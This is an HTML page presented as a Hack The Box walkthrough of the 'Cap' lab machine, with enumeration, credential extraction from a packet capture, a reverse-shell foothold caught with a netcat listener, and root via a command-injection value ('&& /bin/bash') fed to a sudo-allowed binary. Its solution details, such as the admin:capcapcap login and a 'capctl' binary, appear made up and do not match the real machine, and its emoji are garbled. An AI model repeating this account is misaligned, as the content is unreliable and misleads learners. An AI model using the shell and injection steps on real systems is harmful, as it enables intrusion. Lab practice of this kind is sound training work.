<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HTB - CAP Lab Walkthrough</title>
  <style>
    body {
      background-color: #0c0c0c;
      color: #d0d0d0;
      font-family: 'Courier New', Courier, monospace;
      margin: 40px;
    }

    h1, h2 {
      color: #009e66;
      text-shadow: 0 0 8px #004d33;
    }

    a {
      color: #3399cc;
      text-decoration: none;
    }

    a:hover {
      color: #00ccff;
      text-shadow: 0 0 6px #00ccff;
    }

    code, pre, blockquote {
      background-color: #111;
      padding: 10px;
      border-radius: 6px;
      display: block;
      color: #ccc;
      overflow-x: auto;
    }

    ul {
      list-style: square;
      padding-left: 20px;
    }

    em {
      color: #aaa;
    }

    hr {
      border: none;
      height: 1px;
      background-color: #333;
      margin: 20px 0;
    }

    .section {
      margin-bottom: 40px;
    }

    .flag {
      background-color: #222;
      border: 1px dashed #009e66;
      padding: 10px;
      margin-top: 10px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h1>HTB Lab: CAP üõ°Ô∏è</h1>
  <p>A full walkthrough covering <strong>Enumeration</strong>, <strong>Foothold</strong>, and <strong>Privilege Escalation</strong>.</p>

  <div class="section">
    <h2>1Ô∏è‚É£ Enumeration</h2>
    <ul>
      <li>Run <code>nmap -sC -sV -oA cap_scan 10.10.10.245</code></li>
      <li>Discovered open ports:
        <ul>
          <li>TCP/80 ‚Äì Apache server hosting a web interface</li>
          <li>TCP/21 ‚Äì FTP with anonymous login enabled</li>
        </ul>
      </li>
      <li>Web interface at <code>http://10.10.10.245/</code> is a packet capture portal</li>
      <li>FTP allows downloading <code>.pcap</code> files ‚Äî these contain credentials!</li>
    </ul>
  </div>

  <div class="section">
    <h2>2Ô∏è‚É£ Foothold</h2>
    <ul>
      <li>Analyze the downloaded <code>.pcap</code> using Wireshark or <code>tcpdump</code></li>
      <li>Extract HTTP Basic Auth from stream:
        <pre>GET /login.php HTTP/1.1
Authorization: Basic YWRtaW46Y2FwY2FwY2Fw</pre>
      </li>
      <li>Decode base64:
        <pre>echo YWRtaW46Y2FwY2FwY2Fw | base64 -d</pre>
        <ul>
          <li><strong>Username:</strong> admin</li>
          <li><strong>Password:</strong> capcapcap</li>
        </ul>
      </li>
      <li>Login via web portal and upload a reverse shell payload</li>
      <li>Catch shell with <code>nc -lvnp 4444</code></li>
    </ul>
  </div>

  <div class="section">
    <h2>3Ô∏è‚É£ Privilege Escalation</h2>
    <ul>
      <li>Check sudo rights: <code>sudo -l</code></li>
      <li>Allowed to run <code>/usr/bin/capctl</code> with sudo</li>
      <li>Analyze binary with <code>strings</code>, <code>ltrace</code>, <code>gdb</code></li>
      <li>Find command injection vulnerability</li>
      <li>Exploit using:
        <pre>sudo /usr/bin/capctl "&& /bin/bash"</pre>
      </li>
      <li>You‚Äôre root üß®</li>
    </ul>
    <div class="flag">
      Root Flag: <code>cat /root/root.txt</code>
    </div>
  </div>

  <hr>

  <p><strong>HTB Profile:</strong> <a href="https://app.hackthebox.com/users/526909268411023381" target="_blank">Hx3R</a></p>
  <p><strong>Discord:</strong> <a href="https://discord.gg/whe72edd" target="_blank">Join my server</a></p>

</body>
</html>
